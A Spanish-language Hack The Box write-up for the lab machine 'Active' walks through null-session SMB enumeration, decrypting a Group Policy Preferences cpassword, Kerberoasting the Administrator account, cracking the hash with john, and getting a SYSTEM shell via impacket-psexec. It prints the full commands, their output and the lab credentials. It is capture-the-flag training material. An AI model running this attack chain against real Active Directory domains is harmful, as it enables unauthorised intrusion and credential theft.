---
title: "HTB - Active"
Summary: "Active is an easy to medium difficulty machine, which features two very prevalent techniques to gain privileges within an Active Directory environment."
layoutBackgroundBlur: true
date: 2026-07-26
layoutBackgroundHeaderSpace: true
showhero: true
herostyle: "background"
tags: ["HackTheBox", "Windows", "Active Directory"]
---

{{< machine-HTB name="Active" platform="Hack The Box" ip="10.129.43.71" os="Windows" difficulty="easy" >}}

## Pistas
---

Esta sección está diseñada por si no quieres leer el writeupp completo y necesitas algunas pistas

<style>
  .spoiler-toggle {
    position: absolute;
    opacity: 0;
    pointer-events: none;
  }

  .spoiler-text {
    cursor: pointer;
    filter: blur(6px);
    opacity: 0.35;
    transition: filter 0.2s ease, opacity 0.2s ease;
  }

  .spoiler-toggle:checked + .spoiler-text {
    filter: none;
    opacity: 1;
    user-select: text;
  }
</style>

Hint 1:
<input class="spoiler-toggle" type="checkbox" id="step-1">
<label class="spoiler-text" for="step-1">
  Permitir las conexiones nulas no es lo más ideal, en especial cuando tienes carpetas compartidas con archivos importantes
</label>

Hint 2:
<input class="spoiler-toggle" type="checkbox" id="step-2">
<label class="spoiler-text" for="step-2">
  El nombre del archivo parece ser conocido, una búsqueda en google no haría nada mal
</label>

Hint 3:
<input class="spoiler-toggle" type="checkbox" id="step-3">
<label class="spoiler-text" for="step-3">
  Cifrado ? Eso no es problema para repositorios en github
</label>

Hint 4:
<input class="spoiler-toggle" type="checkbox" id="step-4">
<label class="spoiler-text" for="step-4">
  Los clásicos ASREP-ROAST y Kerberoasting, sino es una es la otra
</label>


## Writeupp
---

### Reconocimiento

Comenzamos realizando es el escaneo de puertos y servicios, para ellos nos apoyaremos de nmap por medio del comando: 

```sh
nmap -sS -Pn -n --min-rate 5000 -p- 10.129.43.71 -sV
```

```ruby
Nmap scan report for 10.129.43.71
Host is up (0.10s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-27 02:21:49Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msdfsr?
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  unknown
49162/tcp open  unknown
49166/tcp open  unknown
49169/tcp open  unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
```

Podemos obtener alguna información respecto a este escaneo:

- Los puertos de LDAP (p.e. 389) nos arroja el nombre el dominio *active.htb*
- El *OS detection* propio de nmap arroja que la máquina es un windows server 2008 R2 (última línea del escaneo)
- Disponer del puerto 9389 indica que posiblemente estamos frente a un Domain Controller

Empezaremos buscando recursos compartidos por medio del protocolo SMB, esto debido a que podemos ver que el puerto 445 se encuentra abierto dentro de la máquina.

Para realizar un análisis sobre el puerto 445 usaremos la herramienta *nxc* (abreviación de *netexec*)

```sh
❯ nxc smb 10.129.43.71
SMB         10.129.43.71    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
```

Con este resultado corroboramos el nombre del dominio, además obtenemos la característica de que permite autenticaciones nulas **(Null Auth:True)**, esto nos permite tener una sesión sin disponer de un usuario y contraseña (no necesariamente permite el acceso a la máquina), esto se usará para intentar listar recursos compartidos.

```sh
❯ nxc smb 10.129.43.71 -u '' -p '' --shares
SMB         10.129.43.71    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.43.71    445    DC               [+] active.htb\: 
SMB         10.129.43.71    445    DC               [*] Enumerated shares
SMB         10.129.43.71    445    DC               Share           Permissions     Remark
SMB         10.129.43.71    445    DC               -----           -----------     ------
SMB         10.129.43.71    445    DC               ADMIN$                          Remote Admin
SMB         10.129.43.71    445    DC               C$                              Default share
SMB         10.129.43.71    445    DC               IPC$                            Remote IPC
SMB         10.129.43.71    445    DC               NETLOGON                        Logon server share 
SMB         10.129.43.71    445    DC               Replication     READ            
SMB         10.129.43.71    445    DC               SYSVOL                          Logon server share 
SMB         10.129.43.71    445    DC               Users
```

La máquina dispone del recurso *Replciation* con acceso de lectura para una sesión nula, antes de usar herramientas para ingresar y listar archivos usaremos un módulo de nxc llamado *spider_plus*, este módulo nos arroja las rutas de todos los archivos que podamos encontrar en esa carpeta y así ahorrar tiempo en buscar en cada sub-carpeta.

```sh
❯ nxc smb 10.129.43.71 -u '' -p '' -M spider_plus -o OUTPUT_FOLDER=./
SMB         10.129.43.71    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.43.71    445    DC               [+] active.htb\: 
SPIDER_PLUS 10.129.43.71    445    DC               [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.43.71    445    DC               [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.129.43.71    445    DC               [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.43.71    445    DC               [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.43.71    445    DC               [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.43.71    445    DC               [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.43.71    445    DC               [*]  OUTPUT_FOLDER: ./
SMB         10.129.43.71    445    DC               [*] Enumerated shares
SMB         10.129.43.71    445    DC               Share           Permissions     Remark
SMB         10.129.43.71    445    DC               -----           -----------     ------
SMB         10.129.43.71    445    DC               ADMIN$                          Remote Admin
SMB         10.129.43.71    445    DC               C$                              Default share
SMB         10.129.43.71    445    DC               IPC$                            Remote IPC
SMB         10.129.43.71    445    DC               NETLOGON                        Logon server share 
SMB         10.129.43.71    445    DC               Replication     READ            
SMB         10.129.43.71    445    DC               SYSVOL                          Logon server share 
SMB         10.129.43.71    445    DC               Users                           
SPIDER_PLUS 10.129.43.71    445    DC               [+] Saved share-file metadata to "./10.129.43.71.json".
SPIDER_PLUS 10.129.43.71    445    DC               [*] SMB Shares:           7 (ADMIN$, C$, IPC$, NETLOGON, Replication, SYSVOL, Users)
SPIDER_PLUS 10.129.43.71    445    DC               [*] SMB Readable Shares:  1 (Replication)
SPIDER_PLUS 10.129.43.71    445    DC               [*] Total folders found:  22
SPIDER_PLUS 10.129.43.71    445    DC               [*] Total files found:    7
SPIDER_PLUS 10.129.43.71    445    DC               [*] File size average:    1.16 KB
SPIDER_PLUS 10.129.43.71    445    DC               [*] File size min:        22 B
SPIDER_PLUS 10.129.43.71    445    DC               [*] File size max:        3.63 KB
```

Este módulo nos arroja un json con todas las rutas que necesitamos

```json
❯ cat 10.129.43.71.json
{
    "Replication": {
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "23 B"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "119 B"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "1.07 KB"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "533 B"
        },
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "2.72 KB"
        },
        "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "22 B"
        },
        "active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf": {
            "atime_epoch": "2018-07-21 06:37:44",
            "ctime_epoch": "2018-07-21 06:37:44",
            "mtime_epoch": "2018-07-21 06:38:11",
            "size": "3.63 KB"
        }
    }
}
```

Dentro de los archivos que podemos visualizar se encuentra uno llamado *Groups.xml*, este es un archivo común dentro del AD que guarda credenciales cifradas, iremos directo a descargar ese archivo.

```sh
❯ smbclient -U '' //10.129.43.71/Replication -N
Try "help" to get a list of possible commands.
smb: \> cd active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 16:46:06 2018

                5217023 blocks of size 4096. 279492 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)
```

Al leer este archivo podemos ver que tiene la contraseña cifrada del usuario *SVC_TGS*

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
#### Group Policy Preference

Este archivo en concreto es uno creado debido a la creación de un GPP (Group Policy Preference), el GPP es una funcionalidad dentro del Active Directory que permite a los administradores gestionar "cosas" dentro del AD, por ejemplo, si se quería agregar un usuario administrador local en todas las computadoras del dominio se creaba una GPP y este generaba un archivo xml que automatizara esa acción, ese archivo normalmente era llamado "Groups.xml". Lo particular llega cuando antes estos archivos disponían de contraseñas (cifradas) y se guardaban dentro de una ruta compartida llamada *SYSVOL* (en esta máquina no la encontramos ahí, pero esa es una carpeta que usualmente podía ser accedida por todos los usuarios).
Todo tranquilo hasta ese punto (supongo), lo malo ocurre cuando esa contraseña es cifrada con una llave que el mismo microsoft comparte tiempo despues, lo que permitiría a cualquiera que pudiese tener acceso a esa contraseña poder descifrarla y obtenerlo en texto plano.

{{< figure src="HTB - Active 02-26-07-2026-img.png" alt="Microsoft" figureClass="text-center" caption="[Password Encryption - Miscrosoft](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN)" class="mx-auto" >}}

Gracias a esto se crearon diversas herramientas que permiten obtener las contraseñas cifradas de estos archivos, la que usaremos será una llamada [**gpp-decrypt**](https://github.com/t0thkr1s/gpp-decrypt) y colocaremos la contraseña que se encuentra en el campo *cpassword* dentro del archivo *Groups.xml*

{{< github repo="t0thkr1s/gpp-decrypt" showThumbnail=false >}}


```sh
❯ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ'
GPPstillStandingStrong2k18
```

### Acceso Inicial

Verificamos que la cuenta es válida.

```sh
❯ nxc smb 10.129.43.71 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
SMB         10.129.43.71    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.43.71    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
```

Con esta cuenta válida podemos intentar realizar un ataque de kerberoasting o ASREP-ROAST, ambas técnicas tienen la particularidad de que nos pueden dar hashes de contraseñas de usuarios que disponen de ciertas características en el AD, para ello nos apoyamos de nxc

```sh
# ASREP-ROAST
❯ nxc ldap 10.129.43.71 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --asreproast output
LDAP        10.129.43.71    389    DC               [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb) (signing:None) (channel binding:
LDAP        10.129.43.71    389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
LDAP        10.129.43.71    389    DC               No entries found!

# Kerberoasting  
❯ nxc ldap 10.129.43.71 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --kerberoast output
LDAP        10.129.43.71    389    DC               [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb) (signing:None) (channel binding:
LDAP        10.129.43.71    389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
LDAP        10.129.43.71    389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.129.43.71    389    DC               [*] Total of records returned 1
[-] Some other OSError occured: [Errno Connection error (ACTIVE.HTB:88)] [Errno -2] Name or service not known
LDAP        10.129.43.71    389    DC               [-] Error retrieving TGT for active.htb\SVC_TGS from None
```

Al realizar el kerberoasting attack notamos un mensaje de error dentro de la herramienta, esto significa que el nombre de dominio *active.htb* no está siendo reconocido, para ello indexaremos el nombre y a ip de la máquina dentro de nuestro archivo */etc/hosts*

```sh
❯ cat /etc/hosts

# HackTheBox
10.129.43.71 active.htb
```

Al realizar esto procedemos a ejecutar el comando para el ataque hacia kerberos y obtenemos el siguiente resultado:

```sh
❯ nxc ldap 10.129.43.71 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --kerberoast output+
LDAP        10.129.43.71    389    DC               [*] Windows 7 / Server 2008 R2 Build 7601 (name:DC) (domain:active.htb) (signing:None) (channel binding:No TLS cert)                                                                                                                                                
LDAP        10.129.43.71    389    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
LDAP        10.129.43.71    389    DC               [*] Skipping disabled account: krbtgt
LDAP        10.129.43.71    389    DC               [*] Total of records returned 1
LDAP        10.129.43.71    389    DC               [*] sAMAccountName: Administrator, memberOf: ['CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb', 'CN=Domain Admins,CN=Users,DC=active,DC=htb', 'CN=Enterprise Admins,CN=Users,DC=active,DC=htb', 'CN=Schema Admins,CN=Users,DC=active,DC=htb', 'CN=Administrators,CN=Builtin,DC=active,DC=htb'], pwdLastSet: 2018-07-18 15:06:40.351723, lastLogon: 2026-07-26 20:59:58.715341
LDAP        10.129.43.71    389    DC               $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$02905e450b11040f567f589909e6e3f9$fd84806b180b1498dfc7f08dccd7d2a0e0ea521013b5fb76d090bb0fc7086ae0562e913fdf48a9123c676f03434e3caab62c865043b3ef1d479a7e5567c6cb26a957b026c43e7586c92cf58128a3c1bde27882ba37fff47b52f72f264017a85c434e53b3b5c8ef517cfb27861d64b213306012fa3d63aadc6f27b2106ae8aad370167d46ee169e3e0220254b02f58e33f5003883e58a1282a72c5b36e27d055c10fbb8ae795089908fcc667198c818995e0503b6529b95a5728d8586942269dce228d70d5482f9ba4e260010867ca03ec9231ed96c9bdb05fe4696caec32d8b5e693e61653e73a7876d6b39ea00ddaff54cac0efcb8f91ee50a084b4613ae7bf4ace1346f893eb5834d5517405156b5a6002f3ee382050333745463a71ad44538cf729decb7ac881fa128a3b8dbceb92262f1c914b0a4fc9e41349d4b8b825a61ffea491498a5faaedc8d9b357d55af728fc548b76ea58f1c8f9bd346cd8d6f4fc49c39210b7f639689087a13d38fa2618cd618d29e48f90e012d4b29e291b08f9f557dbdaf4637e6317cc3da94bec65982bd221b9a847e37005f0a9ce8346a81edcace629a3c77eab0919688f400498673dd5a3573b2bf6a38b37a487b830906dc4d17e7d85f1cea1fdfb32f0d748304747b1c946b23d22af65963878c34152aa5d54f42549d9e0b5e6dd4c901a77b3b01e82262405087a4452053879fead46b6e6fbc07b5b77e7423533448319fae643061b2bc72087aeb50b4d78e28169be6bdee534fa6996ff0fc126da26bc9a4b8a46d666a4597e1acabdd4e0da558bb3b2752b86d5589f6f455048a6212d78ea2d9184950afc86cfec6789bbcca49fb06897bc7d58f62b9630ec0d7cdd0e25b20abacb66824fd4c389ee3da8f13fbc08fdfee4328294763aa55ad08d7c73012b1ce1da6a03226de1e852d76bdae18d82e5529ea718259e6223614ec4ad9dc74ce104ff5e5cfc2b08a6a82e3f3ce8b9d2cac2a20231ab655337c51689c8b7815695237bc27be141d48789208e8ec3b6bd325397d7f7cfdbb226e1c7ba3e38a83931232012d97a377ae0ed03c02b26f67bd48b425c803bf14f86a90298f3f7baf22682b2fa13bf22b6057ceb5c07ee8b676cf3ed69369f24224fa6e6d84fb1e56d52a1c01fc0f6e367bdc4db178a2c90abe5b5f38df2b4522a969e11ed154dd2a7cd661772955e189207874516115e200be1556252a8e851a38454ac728989273e7d1b1e526ec52037385c
```

Se puede notar que se obtiene el hash del usuario Administrator, de obtenerlo podemos acceder de forma privilegiada dentro de la máquina, para decifrar la contraseña utilizaremos el diccionario *rockyou.txt* y la herramienta *john*

```sh
# primero guardamos el contenido del hash dentro de un archivo cualquiera, en este caso el archivo se llamará hash
❯ catn hash
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$02905e450b11040f567f589909e6e3f9$fd84806b180b1498dfc7f08dccd7d2a0e0ea521013b5fb76d090bb0fc7086ae0562e913fdf48a9123c676f03434e3caab62c865043b3ef1d479a7e5567c6cb26a957b026c43e7586c92cf58128a3c1bde27882ba37fff47b52f72f264017a85c434e53b3b5c8ef517cfb27861d64b213306012fa3d63aadc6f27b2106ae8aad370167d46ee169e3e0220254b02f58e33f5003883e58a1282a72c5b36e27d055c10fbb8ae795089908fcc667198c818995e0503b6529b95a5728d8586942269dce228d70d5482f9ba4e260010867ca03ec9231ed96c9bdb05fe4696caec32d8b5e693e61653e73a7876d6b39ea00ddaff54cac0efcb8f91ee50a084b4613ae7bf4ace1346f893eb5834d5517405156b5a6002f3ee382050333745463a71ad44538cf729decb7ac881fa128a3b8dbceb92262f1c914b0a4fc9e41349d4b8b825a61ffea491498a5faaedc8d9b357d55af728fc548b76ea58f1c8f9bd346cd8d6f4fc49c39210b7f639689087a13d38fa2618cd618d29e48f90e012d4b29e291b08f9f557dbdaf4637e6317cc3da94bec65982bd221b9a847e37005f0a9ce8346a81edcace629a3c77eab0919688f400498673dd5a3573b2bf6a38b37a487b830906dc4d17e7d85f1cea1fdfb32f0d748304747b1c946b23d22af65963878c34152aa5d54f42549d9e0b5e6dd4c901a77b3b01e82262405087a4452053879fead46b6e6fbc07b5b77e7423533448319fae643061b2bc72087aeb50b4d78e28169be6bdee534fa6996ff0fc126da26bc9a4b8a46d666a4597e1acabdd4e0da558bb3b2752b86d5589f6f455048a6212d78ea2d9184950afc86cfec6789bbcca49fb06897bc7d58f62b9630ec0d7cdd0e25b20abacb66824fd4c389ee3da8f13fbc08fdfee4328294763aa55ad08d7c73012b1ce1da6a03226de1e852d76bdae18d82e5529ea718259e6223614ec4ad9dc74ce104ff5e5cfc2b08a6a82e3f3ce8b9d2cac2a20231ab655337c51689c8b7815695237bc27be141d48789208e8ec3b6bd325397d7f7cfdbb226e1c7ba3e38a83931232012d97a377ae0ed03c02b26f67bd48b425c803bf14f86a90298f3f7baf22682b2fa13bf22b6057ceb5c07ee8b676cf3ed69369f24224fa6e6d84fb1e56d52a1c01fc0f6e367bdc4db178a2c90abe5b5f38df2b4522a969e11ed154dd2a7cd661772955e189207874516115e200be1556252a8e851a38454ac728989273e7d1b1e526ec52037385c

# intenamos descifrar la contraseña con el diccionario rockyou.txt
❯ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)     
1g 0:00:00:01 DONE (2026-07-27 00:37) 0.6172g/s 6506Kp/s 6506Kc/s 6506KC/s Tiffani1432..Thanongsuk_police
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
### Escalamiento de privilegios

Verificaremos la credencial encontrada

```sh
❯ nxc smb 10.129.43.71 -u 'Administrator' -p 'Ticketmaster1968'
SMB         10.129.43.71    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                            
SMB         10.129.43.71    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```

Obtenemos que la credencial es válida, ahora ingresaremos a la máquina utilizando la herramienta psexec de impacekt

```sh
❯ impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.129.43.71
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.43.71.....
[*] Found writable share ADMIN$
[*] Uploading file qBnjRhFX.exe
[*] Opening SVCManager on 10.129.43.71.....
[*] Creating service xIJi on 10.129.43.71.....
[*] Starting service xIJi.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DC
```

Así terminamos ingresando a la máquina con permisos de administrador, luego tendríamos que encontrar los archivos *user.txt* y *root.txt* dentro de la máquina y colocar el hash en la plataforma de HTB.